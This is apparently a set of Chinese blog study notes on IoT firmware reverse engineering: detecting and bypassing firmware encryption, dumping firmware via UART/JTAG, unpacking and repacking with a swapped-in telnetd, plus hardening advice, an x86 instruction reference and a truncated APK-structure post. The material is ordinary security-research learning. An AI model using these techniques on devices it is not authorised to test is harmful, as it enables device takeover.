    <content><![CDATA[<h2 id="固件解密"><a href="#固件解密" class="headerlink" title="固件解密"></a>固件解密</h2><h3 id="固件加密判断"><a href="#固件加密判断" class="headerlink" title="固件加密判断"></a>固件加密判断</h3><ul>
<li><p>使用二进制编辑器</p>
<blockquote>
<p>特性：除了固件指示头没有可见字符、数据按比特展开01频率基本一致、</p>
</blockquote>
</li>
<li><p>binwalk</p>
<blockquote>
<ul>
<li>binwalk -e无法解析结构；</li>
<li>binwalk -A识别不出CPU架构。</li>
</ul>
</blockquote>
</li>
</ul>
<h3 id="调试直接读取"><a href="#调试直接读取" class="headerlink" title="调试直接读取"></a>调试直接读取</h3><p>设备启动后利用UART、JTAG、console等网络手段吧固件打包回传。这样可以绕过解密环节。</p>
<h3 id="对比边界版本"><a href="#对比边界版本" class="headerlink" title="对比边界版本"></a>对比边界版本</h3><p>此方法适用于旧版固件未加密、新版加密，可以从这两者之间的中间版本寻找边界版本，捷豹最后一个未加密版本逆向升级程序即可还原加密过程。</p>
<p>下载固件、解包、时移世易firnware、upgrade、update、download等关键字组合定位升级程序位置。</p>
<h3 id="逆向升级程序"><a href="#逆向升级程序" class="headerlink" title="逆向升级程序"></a>逆向升级程序</h3><p>此方法适用于已获得到升级程序</p>
<h3 id="漏洞获取秘钥"><a href="#漏洞获取秘钥" class="headerlink" title="漏洞获取秘钥"></a>漏洞获取秘钥</h3><p>如果找不到便捷版本，又占不到调试接口或不熟悉硬件调试，可以考虑采用历史版本漏洞先获取设备控制权，再拿到升级程序逆向加密算法。此方法适用于存在RCE漏洞的历史固件。</p>
<h2 id="固件解包"><a href="#固件解包" class="headerlink" title="固件解包"></a>固件解包</h2><ul>
<li><p>UBI</p>
<blockquote>
<p>UBI使用binwalk并不能直接解包，可以使用<a href="https://github.com/jrspruitt/ubi_reader">ubi_reader</a></p>
<p>需要注意的地方：UBI-reader解包，UBI文件必须是1024butes的整数倍。 </p>
</blockquote>
</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">安装ubi_reader</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> sudo apt-get install liblzo2-dev</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> sudo pip install python-lzo</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> git <span class="built_in">clone</span> https://github.com/jrspruitt/ubi_reader</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> <span class="built_in">cd</span> ubi_reader</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> sudo python setup.py install</span></span><br><span class="line"><span class="meta">#</span><span class="bash">或直接：</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> sudo pip install ubi_reader</span></span><br></pre></td></tr></table></figure>
<ul>
<li><p>U-boot</p>
<blockquote>
<p>很多IOT设备会采用U-boot做引导</p>
</blockquote>
</li>
</ul>
<h2 id="固件打包"><a href="#固件打包" class="headerlink" title="固件打包"></a>固件打包</h2><ul>
<li><p>交叉编译</p>
<p>  路由器固件会遵循GPL，就是开源一部分代码软件，并提供剩下软件的二进制文件和整个固件的打包工具。</p>
</li>
<li><p>firmware-mod-kit</p>
<p>  firmware-mod-kit（<a href="https://github.com/mirror/firmware-mod-kit">fmk</a>）是最常用的基于binwalk的解包打包工具，安装如下</p>
  <figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> For ubuntu</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> sudo apt-get install git build-essential zlib1g-dev liblzma-dev python-magic bsdmainutils autoconf</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> For redhat/centos</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> yum groupinstall <span class="string">&quot;Development Tools&quot;</span></span></span><br><span class="line"><span class="meta">$</span><span class="bash"> yum install git zlib1g-dev xz-devel python-magic zlib-devel util-linux</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> 使用</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> ./extract-firmware.sh firmware.bin //解包</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> cp new-telnetd fmk/rootfs/usr/sbin/telnetd //按需修改</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> ./build-firmware.sh //打包</span></span><br></pre></td></tr></table></figure></li>
<li><p>手动分析</p>
<p>  打包的难度在于要与原固件一直，并通过各种校验。</p>
<p>  可以先获取固件大小(十六进制)，根据固件大小端拆分字节，一般是4字节，然后在固件头上寻找类似字节(固件头上的指示长度会减去头长度)，接着从指示大小的字节往后分析就可以澄清格式，和分析网络协议的过程很像。</p>
</li>
</ul>
<h2 id="固件模拟"><a href="#固件模拟" class="headerlink" title="固件模拟"></a>固件模拟</h2><p>工具：qemu、Unicorn、Qiling、Firmadyne、</p>
<p><em>PS:本文仅是学习笔记，将自己认为重要的点记录下来；</em></p>
]]></content>
      <categories>
        <category>固件逆向</category>
      </categories>
      <tags>
        <tag>固件逆向</tag>
      </tags>
  </entry>
  <entry>
    <title>智能设备安全分析_笔记(0X01)</title>
    <url>/%E6%99%BA%E8%83%BD%E8%AE%BE%E5%A4%87%E5%AE%89%E5%85%A8%E5%88%86%E6%9E%90%E7%AC%94%E8%AE%B0(0x01)/</url>
    <content><![CDATA[<p>本篇是参考绿盟格物实验室的一篇文章而写的笔记以及推荐书籍的记录笔记，因为是个人笔记就写的比较随意了</p>
<p>先来看一下通信的架构拓扑图。</p>
<h1 id="智能设备基础"><a href="#智能设备基础" class="headerlink" title="智能设备基础"></a>智能设备基础</h1><h2 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h2><h4 id="拓扑图"><a href="#拓扑图" class="headerlink" title="拓扑图"></a>拓扑图</h4><p>当前大部分智能设备采用的是“智能设备终端”&lt;–&gt; “云服务端” &lt;–&gt;“移动终端 APP”系统架构 [4] 情况可能缺少云端或者 APP 端。</p>
<p><img src= "/img/loading.gif" data-lazy-src="https://i.loli.net/2021/01/04/w3GJjsvaFdiESzh.png"></p>
<p>硬件组成：</p>
<blockquote>
<ul>
<li>CPU：X86/ARM/MIPS/PPC等</li>
<li>内存：SDRAM/RAM存储/SD 卡/MMC卡 / 硬盘</li>
<li>网口</li>
<li>串口</li>
<li>USB 口</li>
<li>无线接口：Wi-Fi/ 蓝牙 /ZigBee 等</li>
</ul>
</blockquote>
<h3 id="智能设备攻击面："><a href="#智能设备攻击面：" class="headerlink" title="智能设备攻击面："></a>智能设备攻击面：</h3><p><img src= "/img/loading.gif" data-lazy-src="https://i.loli.net/2021/01/04/RjsCKt91l4SYDnc.png"></p>
<h3 id="APP可能存在的风险点："><a href="#APP可能存在的风险点：" class="headerlink" title="APP可能存在的风险点："></a>APP可能存在的风险点：</h3><ul>
<li>登陆鉴权机制是否完善</li>
<li>通讯数据是否加密传输</li>
<li>敏感信息是否加密存储</li>
<li>加密算法是否健壮</li>
</ul>
<h2 id="网络通信协议安全"><a href="#网络通信协议安全" class="headerlink" title="网络通信协议安全"></a>网络通信协议安全</h2><p>在智能设备系统中，除了智能设备终端、移动终端 APP、云服务端这三个重要节点外，三者之间的通讯安全 对整个系统来说也是也举足轻重。</p>
<blockquote>
<ol>
<li>APP 与云端一般通过HTTP、HTTPS 通信，分析中应判断通信流量是否加密，可否抓包劫持通信数据； </li>
<li>设备与云端一般采用 MQTT、 XMPP、 CoAP 等协议通信，也会使用 HTTP、 HTTPS 通信 , 部分厂家的 设备会使用私有协议进行通讯，例如京东、小米、broadlink 等；</li>
<li>APP 与设备之间通信一般利用短距离无线网络进行通信，如 ZigBee、 Wi-Fi 以及蓝牙等。</li>
</ol>
</blockquote>
<p><img src= "/img/loading.gif" data-lazy-src="https://i.loli.net/2021/01/05/p5zy1FYwrEH74TA.png" alt="技术对比"></p>
<h1 id="硬件安全"><a href="#硬件安全" class="headerlink" title="硬件安全"></a>硬件安全</h1><h2 id="PCB信息收集"><a href="#PCB信息收集" class="headerlink" title="PCB信息收集"></a>PCB信息收集</h2><p>PCB（ Printed Circuit Board），中文名称为印制电路板，又称印刷线路板，是重要的电子部件，是电子元器 件的支撑体。</p>
<h3 id="PCB丝印"><a href="#PCB丝印" class="headerlink" title="PCB丝印"></a>PCB丝印</h3><p>会暴露各引脚的名称以及功能</p>
<h3 id="芯片信息"><a href="#芯片信息" class="headerlink" title="芯片信息"></a>芯片信息</h3><p>芯片信号往往可以从官方披露信息、芯片上标出而得到。通过搜索引擎可查看引脚图与固件下载方式。</p>
<h3 id="加固建议"><a href="#加固建议" class="headerlink" title="加固建议"></a>加固建议</h3><ol>
<li>出厂前清除丝印</li>
<li>设置读保护，使得设备不可读</li>
<li>使用不常见的螺丝使得不能被拆卸</li>
<li>设置篡改检测</li>
</ol>
<h2 id="中间人攻击"><a href="#中间人攻击" class="headerlink" title="中间人攻击"></a>中间人攻击</h2><p>攻击可以嗅探两个不同的硬件组件之间传递的数据，并加以分析，如果这些信息没有经过加密处理，很容易 获取到关键信息，例如秘钥之类。</p>
<h1 id="固件安全"><a href="#固件安全" class="headerlink" title="固件安全"></a>固件安全</h1><h2 id="固件存储位置"><a href="#固件存储位置" class="headerlink" title="固件存储位置"></a>固件存储位置</h2><p>安全分析人员只要知道智能设备的组成部分中哪些元器件具备存储固件的能力，就能大体知道固件在 智能设备上的存储位置了。</p>
<p>必须知道智能设备固件被厂家写入的地址，才算完整地获取到固件的位置信息。</p>
<p>固件在主板上存储的方式，可以简单分成两类：</p>
<ol>
<li><p>集成式 </p>
<blockquote>
<p>通常设备的固件会被写入到 FLASH 中</p>
</blockquote>
</li>
<li><p>分离式 </p>
<blockquote>
<p>通过引导加载程序（Bootloader）或者利用 JTAG/SWD 等调试接口，控制主控器的读写存储器流程，进而读出固件内容（前提条件 是需要知道固件在存储器 (ROM) 中或者被映射到内存（RAM）中的地址范围。）</p>
</blockquote>
</li>
</ol>
<h2 id="固件获取方法"><a href="#固件获取方法" class="headerlink" title="固件获取方法"></a>固件获取方法</h2><ul>
<li><p><strong>网络升级截获（FTP、HTTP）</strong></p>
<blockquote>
<p>当智能设备进入升级流程时，可以通过抓取升级过程的流量信息，得到智能设备 通过网络升级固件的具体流程，通过模拟固件升级的过程获取固件。</p>
</blockquote>
</li>
<li><p><strong>直接读存储芯片</strong></p>
<blockquote>
<p>将存储器通过焊接的方式取下来</p>
<p>用编程器把固件读取出来</p>
</blockquote>
</li>
<li><p><strong>通过串口等通信总线读取</strong></p>
<blockquote>
<p>以STM32单片机为例，首先把PC与板载UART 接口相连，然后利用主控器内部的Bootloader获取固件</p>
</blockquote>
</li>
<li><p><strong>通过调试接口读取</strong></p>
<blockquote>
<p>有些产品的主板上，会暴露硬件开发调试时所用的接口，如 JTAG/SWD 接口</p>
</blockquote>
</li>
</ul>
<h2 id="固件加固"><a href="#固件加固" class="headerlink" title="固件加固"></a>固件加固</h2><h3 id="通信传输加密与认证"><a href="#通信传输加密与认证" class="headerlink" title="通信传输加密与认证"></a>通信传输加密与认证</h3><p>在产品的升级流程中建议加入加密传输和请求认证的功能。FTP–&gt;SFTP，HTTP–&gt;HTTPS。</p>
<h3 id="隐藏接口"><a href="#隐藏接口" class="headerlink" title="隐藏接口"></a>隐藏接口</h3><p>隐藏引脚信息、删除焊点和丝印</p>
<h3 id="设置主控芯片读保护"><a href="#设置主控芯片读保护" class="headerlink" title="设置主控芯片读保护"></a>设置主控芯片读保护</h3><p>在主控芯片内设置读保护。</p>
<h3 id="固件加密与认证"><a href="#固件加密与认证" class="headerlink" title="固件加密与认证"></a>固件加密与认证</h3><p>利用存储区域的密钥加密设备固件，由于密钥获取难度大，因此可保证提取的固件中文件系统无法被提取。</p>
<p><strong><em>PS:本文仅是学习笔记，将自己认为重要的点记录下来；学习的途径是《智能设备安全分析手册》绿盟格物实验室 编著；</em></strong></p>
]]></content>
      <categories>
        <category>智能设备安全分析</category>
      </categories>
      <tags>
        <tag>智能设备安全分析</tag>
      </tags>
  </entry>
  <entry>
    <title>汇编指令集</title>
    <url>/%E6%B1%87%E7%BC%96%E6%8C%87%E4%BB%A4%E9%9B%86/</url>
    <content><![CDATA[<h2 id="数据传输指令"><a href="#数据传输指令" class="headerlink" title="数据传输指令"></a>数据传输指令</h2><p>数据传输类指令主要包括数据传送、数据交换、堆栈操作、查表转换、地址传送、标志位传送、I/O数据传送指令。这类指令的主要特点是大部分指令操作完成后，对FR中的标志位不产生影响。它们在<a href="https://baike.baidu.com/item/%E5%AD%98%E5%82%A8%E5%99%A8">存储器</a>和<a href="https://baike.baidu.com/item/%E5%AF%84%E5%AD%98%E5%99%A8">寄存器</a>、寄存器和输入输出端口之间传送数据。 [4] </p>
<h3 id="数据传送指令"><a href="#数据传送指令" class="headerlink" title="数据传送指令"></a>数据传送指令</h3><p>MOV：传送字或字节。</p>
<p>MOVSX：先符号扩展，再传送。</p>
<p><a href="https://baike.baidu.com/item/MOVZX">MOVZX</a>：先零扩展，再传送。</p>
<p>PUSH：把字压入<a href="https://baike.baidu.com/item/%E5%A0%86%E6%A0%88">堆栈</a>。</p>
<p>POP： 把字弹出<a href="https://baike.baidu.com/item/%E5%A0%86%E6%A0%88/1682032">堆栈</a>。</p>
<p>PUSHA： 把AX，CX，DX，BX，SP，BP，SI，DI依次压入<a href="https://baike.baidu.com/item/%E5%A0%86%E6%A0%88">堆栈</a>。</p>
<p>POPA： 把DI，SI，BP，SP，BX，DX，CX，AX依次弹出<a href="https://baike.baidu.com/item/%E5%A0%86%E6%A0%88">堆栈</a>。</p>
<p><a href="https://baike.baidu.com/item/PUSHAD">PUSHAD</a>： 把EAX，ECX，EDX，EBX，ESP，EBP，ESI，EDI依次压入<a href="https://baike.baidu.com/item/%E5%A0%86%E6%A0%88">堆栈</a>。</p>
<p>POPAD： 把EDI，ESI，EBP，ESP，EBX，EDX，ECX，EAX依次弹出<a href="https://baike.baidu.com/item/%E5%A0%86%E6%A0%88">堆栈</a>。</p>
<p>BSWAP： 交换32位寄存器里字节的顺序。</p>
<p>XCHG： 交换字或字节。( 至少有一个<a href="https://baike.baidu.com/item/%E6%93%8D%E4%BD%9C%E6%95%B0">操作数</a>为寄存器,<a href="https://baike.baidu.com/item/%E6%AE%B5%E5%AF%84%E5%AD%98%E5%99%A8">段寄存器</a>不可作为操作数)</p>
<p>CMPXCHG： 比较并交换<a href="https://baike.baidu.com/item/%E6%93%8D%E4%BD%9C%E6%95%B0">操作数</a>。（第二个操作数必须为<a href="https://baike.baidu.com/item/%E7%B4%AF%E5%8A%A0%E5%99%A8">累加器</a>AL/AX/EAX）</p>
<p>XADD： 先交换再累加。( 结果在第一个<a href="https://baike.baidu.com/item/%E6%93%8D%E4%BD%9C%E6%95%B0">操作数</a>里 )</p>
<p>XLAT： 字节查表转换── BX 指向一张 256 字节的表的起点，AL 为表的索引值（0-255，即0-FFH）； 返回 AL 为查表结果 （ [BX+AL]-&gt;AL） [6] </p>
<h3 id="输入输出端口传送指令"><a href="#输入输出端口传送指令" class="headerlink" title="输入输出端口传送指令"></a>输入输出端口传送指令</h3><p>IN： I/O端口输入。（ 语法：IN <a href="https://baike.baidu.com/item/%E7%B4%AF%E5%8A%A0%E5%99%A8">累加器</a>，{<a href="https://baike.baidu.com/item/%E7%AB%AF%E5%8F%A3%E5%8F%B7">端口号</a>│DX} ）</p>
<p>OUT： I/O端口输出. （语法：OUT {端口号│DX}，<a href="https://baike.baidu.com/item/%E7%B4%AF%E5%8A%A0%E5%99%A8">累加器</a>）输入输出端口由立即方式指定时，其范围是 0-255；由寄存器DX 指定时，其范围是 0-65535。 [6] </p>
<h3 id="目的地址传送指令"><a href="#目的地址传送指令" class="headerlink" title="目的地址传送指令"></a>目的地址传送指令</h3><p>LEA： 装入<a href="https://baike.baidu.com/item/%E6%9C%89%E6%95%88%E5%9C%B0%E5%9D%80">有效地址</a>。例：LEA DX，string；把<a href="https://baike.baidu.com/item/%E5%81%8F%E7%A7%BB%E5%9C%B0%E5%9D%80">偏移地址</a>存到DX。</p>
<p>LDS： 传送目标<a href="https://baike.baidu.com/item/%E6%8C%87%E9%92%88">指针</a>，把指针内容装入DS。例： LDS SI，string；把<a href="https://baike.baidu.com/item/%E6%AE%B5%E5%9C%B0%E5%9D%80">段地址</a>：<a href="https://baike.baidu.com/item/%E5%81%8F%E7%A7%BB%E5%9C%B0%E5%9D%80">偏移地址</a>存到DS：SI。</p>
<p>LES： 传送目标<a href="https://baike.baidu.com/item/%E6%8C%87%E9%92%88">指针</a>，把指针内容装入ES。例： LES DI，string；把<a href="https://baike.baidu.com/item/%E6%AE%B5%E5%9C%B0%E5%9D%80">段地址</a>：<a href="https://baike.baidu.com/item/%E5%81%8F%E7%A7%BB%E5%9C%B0%E5%9D%80">偏移地址</a>存到ES：DI。</p>
<p>LFS： 传送目标<a href="https://baike.baidu.com/item/%E6%8C%87%E9%92%88">指针</a>，把指针内容装入FS。例： LFS DI，string；把<a href="https://baike.baidu.com/item/%E6%AE%B5%E5%9C%B0%E5%9D%80">段地址</a>：<a href="https://baike.baidu.com/item/%E5%81%8F%E7%A7%BB%E5%9C%B0%E5%9D%80">偏移地址</a>存到FS：DI。</p>
<p>LGS： 传送目标<a href="https://baike.baidu.com/item/%E6%8C%87%E9%92%88">指针</a>，把指针内容装入GS。例： LGS DI，string；把<a href="https://baike.baidu.com/item/%E6%AE%B5%E5%9C%B0%E5%9D%80">段地址</a>：<a href="https://baike.baidu.com/item/%E5%81%8F%E7%A7%BB%E5%9C%B0%E5%9D%80">偏移地址</a>存到GS：DI。</p>
<p>LSS： 传送目标<a href="https://baike.baidu.com/item/%E6%8C%87%E9%92%88">指针</a>，把指针内容装入SS。例： LSS DI，string；把<a href="https://baike.baidu.com/item/%E6%AE%B5%E5%9C%B0%E5%9D%80">段地址</a>：<a href="https://baike.baidu.com/item/%E5%81%8F%E7%A7%BB%E5%9C%B0%E5%9D%80">偏移地址</a>存到SS：DI。 [6] </p>
<h3 id="标志传送指令"><a href="#标志传送指令" class="headerlink" title="标志传送指令"></a>标志传送指令</h3><p><a href="https://baike.baidu.com/item/LAHF">LAHF</a>：<a href="https://baike.baidu.com/item/%E6%A0%87%E5%BF%97%E5%AF%84%E5%AD%98%E5%99%A8">标志寄存器</a>传送，把标志装入AH。</p>
<p>SAHF： <a href="https://baike.baidu.com/item/%E6%A0%87%E5%BF%97%E5%AF%84%E5%AD%98%E5%99%A8">标志寄存器</a>传送，把AH内容装入标志寄存器。</p>
<p>PUSHF： 标志<a href="https://baike.baidu.com/item/%E5%85%A5%E6%A0%88/12688157">入栈</a>。</p>
<p>POPF： 标志<a href="https://baike.baidu.com/item/%E5%87%BA%E6%A0%88">出栈</a>。</p>
<p>PUSHD： 32位标志<a href="https://baike.baidu.com/item/%E5%85%A5%E6%A0%88/12688157">入栈</a>。</p>
<p>POPD： 32位标志<a href="https://baike.baidu.com/item/%E5%87%BA%E6%A0%88">出栈</a>。 [6] </p>
<h2 id="算术运算指令"><a href="#算术运算指令" class="headerlink" title="算术运算指令"></a>算术运算指令</h2><p>算数运算类指令包括加减乘除、比较与调整指令。它们可进行8位、16位和32位的运算。参加运算的操作数可以说二进制数和十进制数（BCD码），这些数可以是无符号数，也可以是带符号数。算术运算指令的主要特点是执行结果影响标志寄存器的状态标志位OF、SF、ZF、AF、PF、CF。 [4] </p>
<p>ADD： 加法。</p>
<p>ADC： 带进位加法。</p>
<p>INC： 加 1。</p>
<p>AAA： 加法的<a href="https://baike.baidu.com/item/ASCII%E7%A0%81/4607931">ASCII码</a>调整。</p>
<p>DAA： 加法的十进制调整。</p>
<p>SUB： 减法。</p>
<p>SBB： 带借位减法。</p>
<p>DEC： 减 1。</p>
<p>NEG： 取补。</p>
<p>CMP： 比较。（两<a href="https://baike.baidu.com/item/%E6%93%8D%E4%BD%9C%E6%95%B0">操作数</a>作减法，仅修改标志位，不回送结果）</p>
<p>AAS： 减法的<a href="https://baike.baidu.com/item/ASCII%E7%A0%81/4607931">ASCII码</a>调整。</p>
<p>DAS： 减法的十进制调整。</p>
<p>MUL： 无符号乘法。结果回送AH和AL（字节运算），或DX和AX（字运算）</p>
<p>IMUL： 整数乘法。结果回送AH和AL（字节运算），或DX和AX（字运算）</p>
<p>AAM： 乘法的ASCII码调整。</p>
<p>DIV： 无符号除法：商回送AL，余数回送AH，（字节运算）；或商回送AX，余数回送DX（字运算）</p>
<p>IDIV： 整数除法：商回送AL，余数回送AH，（字节运算）；或商回送AX，余数回送DX（字运算）</p>
<p>AAD： 除法的<a href="https://baike.baidu.com/item/ASCII%E7%A0%81/4607931">ASCII码</a>调整。</p>
<p>CBW： 字节转换为字。（把AL中字节的符号扩展到AH中去）</p>
<p>CWD： 字转换为双字。（把AX中的字的符号扩展到DX中去）</p>
<p>CWDE： 字转换为双字。 （把AX中的字符号扩展到EAX中去）</p>
<p>CDQ： 双<a href="https://baike.baidu.com/item/%E5%AD%97%E6%89%A9%E5%B1%95">字扩展</a>。（把EAX中的字的符号扩展到EDX中去） [6] </p>
<h2 id="逻辑运算类指令"><a href="#逻辑运算类指令" class="headerlink" title="逻辑运算类指令"></a>逻辑运算类指令</h2><p>逻辑运算类指令分为逻辑运算指令和移位指令两大类。 [4] </p>
<h3 id="逻辑运算指令"><a href="#逻辑运算指令" class="headerlink" title="逻辑运算指令"></a>逻辑运算指令</h3><p>AND： 与运算。</p>
<p>or： 或运算。</p>
<p>XOR： 异或运算。</p>
<p>NOT： 取反。</p>
<p>TEST： 测试。（两<a href="https://baike.baidu.com/item/%E6%93%8D%E4%BD%9C%E6%95%B0">操作数</a>作与运算，仅修改标志位，不回送结果） [6] </p>
<h3 id="移位指令"><a href="#移位指令" class="headerlink" title="移位指令"></a>移位指令</h3><p>SHL： 逻辑左移。</p>
<p>SAL： 算术左移。(=SHL)</p>
<p>SHR： 逻辑右移。（每位右移，低位进 CF，高位补 0）</p>
<p>SAR： 算术右移。（每位右移， 低位进 CF，高位不变）</p>
<p>ROL： 循环左移。</p>
<p>ROR： 循环右移。</p>
<p>RCL： 通过进位的循环左移。</p>
<p>RCR： 通过进位的循环右移。</p>
<p>以上八种移位指令，其移位次数可达255次。</p>
<p>移位一次时，可直接用<a href="https://baike.baidu.com/item/%E6%93%8D%E4%BD%9C%E7%A0%81">操作码</a>，如：SHL AX，1；移位&gt;1次时，则由寄存器CL给出移位次数，如：MOV CL，04；SHL AX，CL。 [6] </p>
<h2 id="串操作指令"><a href="#串操作指令" class="headerlink" title="串操作指令"></a>串操作指令</h2><p>串操作指令用于处理存放在存储器中的数据串，有串传送、串比较、串扫描、串装入、串存储。其中，仅有串比较和串扫描指令对标志位OF、SF、ZF、AF、PF、CF有影响。 [4] </p>
<p>DS：SI ——源串<a href="https://baike.baidu.com/item/%E6%AE%B5%E5%AF%84%E5%AD%98%E5%99%A8">段寄存器</a>：源串<a href="https://baike.baidu.com/item/%E5%8F%98%E5%9D%80">变址</a>。</p>
<p>ES：DI ——目标串<a href="https://baike.baidu.com/item/%E6%AE%B5%E5%AF%84%E5%AD%98%E5%99%A8">段寄存器</a>：目标串<a href="https://baike.baidu.com/item/%E5%8F%98%E5%9D%80">变址</a>。</p>
<p>CX： 重复次数计数器。</p>
<p>AL/AX： 扫描值。</p>
<p>D标志： 0表示重复操作中SI和DI应自动增量；1表示应自动减量。</p>
<p>Z标志： 用来控制扫描或比较操作的结束。</p>
<p>MOVS： 串传送。（MOVSB 传送字符， MOVSW 传送字， MOVSD 传送双字）</p>
<p>CMPS： 串比较。（CMPSB 比较字符， CMPSW 比较字）</p>
<p>SCAS： 串扫描。把AL或AX的内容与目标串作比较，比较结果反映在标志位。</p>
<p>LODS： 装入串。把源串中的元素（字或字节）逐一装入AL或AX中。（<a href="https://baike.baidu.com/item/LODSB">LODSB</a> 传送字符， LODSW 传送字，LODSD 传送双字）</p>
<p>STOS： 保存串。是LODS的逆过程。</p>
<p>REP： 当CX/ECX&lt;&gt;0时重复。</p>
<p>REPE/REPZ： 当ZF=1或比较结果相等，且CX/ECX&lt;&gt;0时重复。</p>
<p>REPNE/REPNZ： 当ZF=0或比较结果不相等，且CX/ECX&lt;&gt;0时重复。</p>
<p>REPC： 当CF=1且CX/ECX&lt;&gt;0时重复。</p>
<p>REPNC： 当CF=0且CX/ECX&lt;&gt;0时重复。 [6] </p>
<h2 id="程序转移指令"><a href="#程序转移指令" class="headerlink" title="程序转移指令"></a>程序转移指令</h2><p>控制转移类指令包括无条件转移指令、条件转移指令、循环控制指令、中断指令、子程序调用和返回指令。 [4] </p>
<h3 id="无条件转移指令"><a href="#无条件转移指令" class="headerlink" title="无条件转移指令"></a>无条件转移指令</h3><p>（长转移）</p>
<p>JMP： 无条件转移指令。</p>
<p>CALL： 过程调用。</p>
<p>RET/RETF： 过程返回。 [6] </p>
<h3 id="条件转移指令"><a href="#条件转移指令" class="headerlink" title="条件转移指令"></a>条件转移指令</h3><p>（短转移，-128到+127的距离内；当且仅当(SF、XOR、OF)=1时，OP1&lt;OP2 ）</p>
<p>JA/JNBE： 大于转移。</p>
<p>JAE/JNB： 大于或等于转移。</p>
<p>JB/JNAE： 小于转移。</p>
<p>JBE/<a href="https://baike.baidu.com/item/JNA">JNA</a>： 小于或等于转移。</p>
<p>以上四条，测试<a href="https://baike.baidu.com/item/%E6%97%A0%E7%AC%A6%E5%8F%B7%E6%95%B4%E6%95%B0">无符号整数</a>运算的结果（标志C和Z）</p>
<p>JG/JNLE： 大于转移。</p>
<p>JGE/JNL： 大于或等于转移。</p>
<p>JL/JNGE： 小于转移。</p>
<p><a href="https://baike.baidu.com/item/JLE">JLE</a>/JNG： 小于或等于转移。</p>
<p>以上四条，测试带符号整数运算的结果（标志S，O和Z）</p>
<p>JE/JZ： 等于转移。</p>
<p>JNE/JNZ： 不等于时转移。</p>
<p>JC： 有进位时转移。</p>
<p>JNC： 无进位时转移。</p>
<p>JNO： 不溢出时转移。</p>
<p>JNP/JPO： 奇偶性为奇数时转移。</p>
<p>JNS： 符号位为 “0” 时转移。</p>
<p>JO： 溢出转移。</p>
<p>JP/JPE： 奇偶性为偶数时转移。</p>
<p>JS： 符号位为 “1” 时转移。 [6] </p>
<h3 id="循环控制指令"><a href="#循环控制指令" class="headerlink" title="循环控制指令"></a>循环控制指令</h3><p>（短转移）</p>
<p>LOOP： CX不为零时循环。</p>
<p>LOOPE/LOOPZ： CX不为零且标志Z=1时循环。</p>
<p>LOOPNE/LOOPNZ： CX不为零且标志Z=0时循环。</p>
<p>JCXZ： CX为零时转移。</p>
<p>JECXZ： ECX为零时转移。 [6] </p>
<h3 id="中断指令"><a href="#中断指令" class="headerlink" title="中断指令"></a>中断指令</h3><p>INT： <a href="https://baike.baidu.com/item/%E4%B8%AD%E6%96%AD%E6%8C%87%E4%BB%A4">中断指令</a>。</p>
<p>INTO： 溢出中断。</p>
<p>IRET： 中断返回。 [6] </p>
<h2 id="其他指令"><a href="#其他指令" class="headerlink" title="其他指令"></a>其他指令</h2><h3 id="伪指令"><a href="#伪指令" class="headerlink" title="伪指令"></a>伪指令</h3><p>DB： 定义字节（1字节）</p>
<p>DW： 定义字（2字节）</p>
<p>DD： 定义双字（4字节）</p>
<p>PROC： 定义过程。</p>
<p>ENDP： 过程结束。</p>
<p>SEGMENT： 定义段。</p>
<p>ASSUME： 建立段<a href="https://baike.baidu.com/item/%E5%AF%84%E5%AD%98%E5%99%A8%E5%AF%BB%E5%9D%80">寄存器寻址</a>。</p>
<p>ENDS： 段结束。</p>
<p>END： 程序结束。 [6] </p>
<h3 id="处理机控制指令"><a href="#处理机控制指令" class="headerlink" title="处理机控制指令"></a>处理机控制指令</h3><p>即标志处理指令，处理机控制指令完成简单的控制功能。</p>
<p>CLC： （进位位置0指令）</p>
<p>CMC： （进位位求反指令）</p>
<p>CLC： （进位位置为0指令）</p>
<p>STC： （进位位置为1指令）</p>
<p>CLD： （方向标志位置0指令）</p>
<p>STD： （方向标志位置1指令）</p>
<p>CLI： （中断标志置0指令）</p>
<p>STI： （中断标志置1指令）</p>
<p>NOP： （无操作）</p>
<p>HLT： （停机）</p>
<p>WAIT： （等待）</p>
<p>ESC： （换码）</p>
<p>LOCK： （封锁） [6]</p>
]]></content>
      <categories>
        <category>x86汇编</category>
      </categories>
      <tags>
        <tag>x86汇编</tag>
      </tags>
  </entry>
  <entry>
    <title>智能硬件安全_笔记(0X01)</title>
    <url>/%E7%A1%AC%E4%BB%B6%E6%99%BA%E8%83%BD%E5%AE%89%E5%85%A8(0x01)/</url>
    <content><![CDATA[<h1 id="手机APK终端安全分析法"><a href="#手机APK终端安全分析法" class="headerlink" title="手机APK终端安全分析法"></a>手机APK终端安全分析法</h1><h2 id="APK及其基本结构"><a href="#APK及其基本结构" class="headerlink" title="APK及其基本结构"></a>APK及其基本结构</h2><h3 id="APK的基本结构"><a href="#APK的基本结构" class="headerlink" title="APK的基本结构"></a>APK的基本结构</h3><p>Android应用程序包文件(APK)是一种Android操作系统上的应用程序安装文件格式。</p>
<p>一个APK文件内包含被编译的代码文件(<code>.dex</code>文件)、资源文件、assets、证书、清单文件。</p>
<h3 id="classes-dex"><a href="#classes-dex" class="headerlink" title="classes.dex"></a>classes.dex</h3><p>classes.dex是将程序中的类和逻辑代码编译成Dalvik虚拟机可以理解的dex文件格式，由Dalvik虚拟机加载并运行。</p>
<h3 id="AndroidManifest-xml"><a href="#AndroidManifest-xml" class="headerlink" title="AndroidManifest.xml"></a>AndroidManifest.xml</h3><p>每个应用的根目录中都必须包含一个AndroidManifesr.xml文件，这个清单文件为Android系统提供有关应用的基本信息，例如：应用名、版本、所需权限、只测的服务、应用的库文件等，系统必须获得这些信息才能运行应用代码。</p>
<blockquote>
<p>该文件在打包时会被编译成二进制XML格式，可以使用共计反编译回XML文本格式。</p>
